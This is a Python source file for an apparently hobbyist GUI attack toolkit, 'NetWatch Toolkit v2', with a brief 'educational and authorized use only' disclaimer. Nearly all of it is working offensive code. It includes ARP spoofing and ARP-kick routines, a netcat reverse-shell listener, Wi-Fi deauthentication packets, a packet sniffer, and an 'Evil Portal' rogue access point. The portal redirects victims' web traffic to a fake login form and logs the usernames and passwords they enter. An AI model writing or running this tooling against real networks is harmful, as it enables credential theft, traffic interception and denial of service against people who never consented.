#!/usr/bin/env python3
"""
NetWatch Toolkit v2 (Final Patched)
Author: Niko DeRuise

USAGE:
    sudo python3 netwatchV2.py

REQUIREMENTS:
    - Python 3.x
    - nmap
    - scapy
    - tkinter
    - hostapd, dnsmasq
    - netcat (nc)

DISCLAIMER:
    For educational and authorized use only.
"""

import os
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
from tkinter import *
from tkinter import ttk, filedialog, messagebox
from scapy.all import ARP, Ether, srp, send, RadioTap, Dot11, Dot11Deauth, sendp

# === Globals ===
evil_dir = "netwatch_portal"
os.makedirs(evil_dir, exist_ok=True)
portal_server = None
evil_processes = []
spoofing = False
kicking = False

def is_root():
    return os.geteuid() == 0

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
    for _, r in ans:
        return r[Ether].src
    return None

def get_default_interface():
    return subprocess.getoutput("ip route | grep default | awk '{print $5}'")

# === Evil Portal HTTP Server ===
class PortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = os.path.join(evil_dir, "index.html")
        try:
            with open(path, "rb") as f:
                html = f.read()
        except:
            html = b"<form method='POST' action='/creds'><input name='user'><input name='pass'><input type='submit'></form>"
        self.send_response(200)
        self.end_headers()
        self.wfile.write(html)

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length).decode()
        creds = parse_qs(data)
        with open(os.path.join(evil_dir, "credentials.txt"), "a") as f:
            f.write(f"{self.client_address[0]} - {creds}\n")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"<h1>Connection Failed</h1>")

def start_portal_server():
    global portal_server
    os.chdir(evil_dir)
    portal_server = HTTPServer(('0.0.0.0', 8080), PortalHandler)
    threading.Thread(target=portal_server.serve_forever, daemon=True).start()

def stop_portal_server():
    global portal_server
    if portal_server:
        portal_server.shutdown()
        portal_server = None

# === GUI Setup ===
if not is_root():
    print("[!] Please run as root.")
    exit()

root = Tk()
root.title("NetWatch Toolkit v2")
root.geometry("1000x700")
style = ttk.Style()
style.theme_use("clam")
style.configure("TNotebook.Tab", background="#222", foreground="#0ff", padding=10)
style.map("TNotebook.Tab", background=[("selected", "#0ff")])
notebook = ttk.Notebook(root)
notebook.pack(expand=1, fill='both')

def create_tab(title):
    tab = Frame(notebook, bg="#1e1e2e")
    notebook.add(tab, text=title)
    frame = Frame(tab)
    frame.pack(expand=1, fill='both')
    output = Text(frame, bg="black", fg="lime", height=10)
    scrollbar = Scrollbar(frame, command=output.yview)
    output.configure(yscrollcommand=scrollbar.set)
    scrollbar.pack(side=RIGHT, fill=Y)
    output.pack(expand=1, fill="both")
    return tab, output

# === Nmap Tab ===
tab1, nmap_output = create_tab("Nmap Scanner")
Label(tab1, text="Target:", bg="#1e1e2e", fg="#0ff").pack()
nmap_target = Entry(tab1, width=40)
nmap_target.pack()
Button(tab1, text="Run Scan", command=lambda: threading.Thread(target=lambda: nmap_output.insert(END, subprocess.getoutput(f"nmap -sS -Pn {nmap_target.get()}") + "\n")).start()).pack()

# === ARP Scanner ===
tab2, arp_output = create_tab("ARP Scanner")
Label(tab2, text="Network CIDR:", bg="#1e1e2e", fg="#0ff").pack()
arp_target = Entry(tab2, width=40)
arp_target.pack()
def arp_scan():
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=arp_target.get())
    ans, _ = srp(pkt, timeout=2, verbose=0)
    for _, r in ans:
        arp_output.insert(END, f"{r.psrc} - {r.hwsrc}\n")
Button(tab2, text="Scan Network", command=lambda: threading.Thread(target=arp_scan).start()).pack()

# === ARP Spoofing ===
tab3, spoof_output = create_tab("ARP Spoof")
Label(tab3, text="Target IP:", bg="#1e1e2e", fg="#0ff").pack()
target_ip = Entry(tab3); target_ip.pack()
Label(tab3, text="Gateway IP:", bg="#1e1e2e", fg="#0ff").pack()
gateway_ip = Entry(tab3); gateway_ip.pack()
def start_spoof():
    global spoofing
    spoofing = True
    def loop():
        tgt = target_ip.get(); gw = gateway_ip.get()
        tgt_mac = get_mac(tgt); gw_mac = get_mac(gw)
        while spoofing:
            send(ARP(op=2, pdst=tgt, psrc=gw, hwdst=tgt_mac), verbose=0)
            send(ARP(op=2, pdst=gw, psrc=tgt, hwdst=gw_mac), verbose=0)
            spoof_output.insert(END, f"Spoofed {tgt} <-> {gw}\n")
            time.sleep(2)
    threading.Thread(target=loop).start()
def stop_spoof(): global spoofing; spoofing = False
Button(tab3, text="Start Spoof", command=start_spoof).pack()
Button(tab3, text="Stop Spoof", command=stop_spoof).pack()

# === ARP Kick ===
tab4, kick_output = create_tab("ARP Kick")
Label(tab4, text="Target IP:", bg="#1e1e2e", fg="#0ff").pack()
kick_target = Entry(tab4); kick_target.pack()
Label(tab4, text="Gateway IP:", bg="#1e1e2e", fg="#0ff").pack()
kick_gateway = Entry(tab4); kick_gateway.pack()
Label(tab4, text="Packets (recommended: 150):", bg="#1e1e2e", fg="#0ff").pack()
kick_count = Entry(tab4); kick_count.insert(0, "150"); kick_count.pack()
def arp_kick_loop():
    global kicking
    target = kick_target.get()
    gateway = kick_gateway.get()
    try: count = int(kick_count.get())
    except: count = 150
    for i in range(count):
        if not kicking: break
        pkt = ARP(op=2, pdst=target, psrc=gateway, hwdst="00:00:00:00:00:00")
        send(pkt, verbose=0)
        kick_output.insert(END, f"[{i+1}/{count}] Sent fake ARP to {target}\n")
        time.sleep(0.05)
    kick_output.insert(END, "[✓] ARP kick complete\n")
def start_kick(): global kicking; kicking = True; threading.Thread(target=arp_kick_loop).start()
def stop_kick(): global kicking; kicking = False
Button(tab4, text="Start Kick", command=start_kick).pack()
Button(tab4, text="Stop Kick", command=stop_kick).pack()

# === Traceroute ===
tab5, trace_output = create_tab("Traceroute")
Label(tab5, text="Target:", bg="#1e1e2e", fg="#0ff").pack()
trace_entry = Entry(tab5); trace_entry.pack()
Button(tab5, text="Run", command=lambda: threading.Thread(target=lambda: trace_output.insert(END, subprocess.getoutput(f"traceroute {trace_entry.get()}") + "\n")).start()).pack()

# === Reverse Shell ===
tab6, shell_output = create_tab("Reverse Shell")
Label(tab6, text="LPORT:", bg="#1e1e2e", fg="#0ff").pack()
lport = Entry(tab6); lport.insert(0, "4444"); lport.pack()
def start_listener(): threading.Thread(target=lambda: os.system(f"nc -lvnp {lport.get()}")).start()
Button(tab6, text="Start Listener", command=start_listener).pack()

# === Evil Portal ===
tab7, portal_output = create_tab("Evil Portal")
Label(tab7, text="SSID:", bg="#1e1e2e", fg="#0ff").pack()
entry_ssid = Entry(tab7); entry_ssid.insert(0, "Free_Public_WiFi"); entry_ssid.pack()
Label(tab7, text="Interface (AP-capable):", bg="#1e1e2e", fg="#0ff").pack()
entry_iface = Entry(tab7); entry_iface.insert(0, "wlan0"); entry_iface.pack()
def select_html():
    path = filedialog.askopenfilename()
    if path:
        with open(path, "r") as src, open(os.path.join(evil_dir, "index.html"), "w") as dst:
            dst.write(src.read())
Button(tab7, text="Select HTML", command=select_html).pack()
def start_evil_ap():
    ssid = entry_ssid.get()
    iface = entry_iface.get()
    conf = f"interface={iface}\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel=6\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0"
    dhcp = f"interface={iface}\ndhcp-range=10.0.0.10,10.0.0.100,12h\naddress=/#/10.0.0.1"
    os.chdir(evil_dir)
    with open("hostapd.conf", "w") as f: f.write(conf)
    with open("dnsmasq.conf", "w") as f: f.write(dhcp)
    os.system(f"ip link set {iface} down")
    os.system(f"ip addr flush dev {iface}")
    os.system(f"ip addr add 10.0.0.1/24 dev {iface}")
    os.system(f"ip link set {iface} up")
    os.system("iptables -t nat -F")
    os.system("iptables -F")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
    os.system(f"iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 80 -j REDIRECT --to-port 8080")
    h = subprocess.Popen(["hostapd", "hostapd.conf"])
    d = subprocess.Popen(["dnsmasq", "-C", "dnsmasq.conf"])
    evil_processes.extend([h, d])
    threading.Thread(target=start_portal_server, daemon=True).start()
    portal_output.insert(END, f"[+] AP '{ssid}' running on {iface}\n")
def stop_evil_ap():
    for p in evil_processes:
        try: p.terminate()
        except: pass
    os.system("killall hostapd dnsmasq")
    os.system("iptables -t nat -F")
    os.system("iptables -F")
    portal_output.insert(END, "[x] Evil Portal stopped.\n")
Button(tab7, text="Start Portal", command=start_evil_ap).pack()
Button(tab7, text="Stop Portal", command=stop_evil_ap).pack()
Button(tab7, text="Show Creds", command=lambda: portal_output.insert(END, open(os.path.join(evil_dir, "credentials.txt")).read() if os.path.exists(os.path.join(evil_dir, "credentials.txt")) else "[!] No credentials yet\n")).pack()

# === Packet Sniffer ===
tab_sniff, sniff_output = create_tab("Packet Sniffer")
Label(tab_sniff, text="Interface to sniff on:", bg="#1e1e2e", fg="#0ff").pack()
sniff_iface = Entry(tab_sniff); sniff_iface.insert(0, "eth0"); sniff_iface.pack()

sniffing = False

def packet_callback(pkt):
    if pkt.haslayer(Ether):
        line = f"{pkt[Ether].src} -> {pkt[Ether].dst} | {pkt.summary()}"
        sniff_output.insert(END, line + "\n")
        sniff_output.see(END)

def start_sniffer():
    global sniffing
    from scapy.all import sniff
    sniffing = True
    iface = sniff_iface.get()
    sniff_output.insert(END, f"[*] Starting packet capture on {iface}\n")
    def sniffer():
        sniff(iface=iface, prn=packet_callback, store=0, stop_filter=lambda x: not sniffing)
    threading.Thread(target=sniffer, daemon=True).start()

def stop_sniffer():
    global sniffing
    sniffing = False
    sniff_output.insert(END, "[x] Sniffing stopped.\n")

Button(tab_sniff, text="Start Sniffing", command=start_sniffer).pack()
Button(tab_sniff, text="Stop Sniffing", command=stop_sniffer).pack()

# === Deauth Attack ===
tab8, deauth_output = create_tab("Deauth Attack ⚠️")
Label(tab8, text="Monitor Interface:", bg="#1e1e2e", fg="#0ff").pack()
iface = Entry(tab8); iface.pack()
Label(tab8, text="Target MAC:", bg="#1e1e2e", fg="#0ff").pack()
client = Entry(tab8); client.pack()
Label(tab8, text="AP MAC:", bg="#1e1e2e", fg="#0ff").pack()
ap = Entry(tab8); ap.pack()
def send_deauth():
    pkt = RadioTap()/Dot11(addr1=client.get(), addr2=ap.get(), addr3=ap.get())/Dot11Deauth()
    sendp(pkt, iface=iface.get(), count=100, inter=0.1)
    deauth_output.insert(END, "[✓] Deauth sent\n")
Button(tab8, text="Send", command=lambda: threading.Thread(target=send_deauth).start()).pack()

# === Reset Tab ===
tab9, reset_output = create_tab("Reset")
def reset_all():
    for tab in root.winfo_children():
        for child in tab.winfo_children():
            if isinstance(child, Entry): child.delete(0, END)
    reset_output.insert(END, "[✓] Fields cleared\n")
Button(tab9, text="Reset Fields", command=reset_all).pack()

root.mainloop()